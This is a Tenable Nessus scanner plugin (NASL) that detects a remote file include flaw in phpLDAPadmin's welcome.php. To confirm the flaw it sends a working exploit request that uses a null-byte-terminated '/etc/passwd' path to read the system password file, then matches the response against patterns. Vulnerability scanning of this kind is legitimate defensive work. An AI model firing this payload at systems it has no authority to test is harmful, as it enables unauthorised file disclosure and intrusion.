#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is affected by a
remote file include issue. 

Description :

The remote host appears to be running phpLDAPadmin, a PHP-based LDAP
browser. 

The version of phpLDAPadmin installed on the remote host fails to
properly sanitize user-supplied input to the 'custom_welcome_page'
parameter of the 'welcome.php' script before using it to include PHP
code.  By leveraging this flaw, an attacker may be able to view
arbitrary files on the remote host and execute arbitrary PHP code,
possibly taken from third-party hosts. 

See also : 

http://retrogod.altervista.org/phpldap.html
http://www.nessus.org/u?08788a63

Solution : 

Upgrade to phpLDAPadmin 0.9.7-alpha6 or later.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19547);
  script_version ("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2792", "CVE-2005-2793");
  script_bugtraq_id(14695);

  name["english"] = "phpLDAPadmin custom_welcome_page Parameter File Include Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for custom_welcome_page parameter file include vulnerability in phpLDAPadmin";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");
 
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw.
  req = http_get(
    item:string(
      dir, "/welcome.php?",
      "custom_welcome_page=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning.+main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Failed opening .*'/etc/passwd")
  ) {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc["english"];

    security_hole(port:port, data:report);
    exit(0);
  }
}
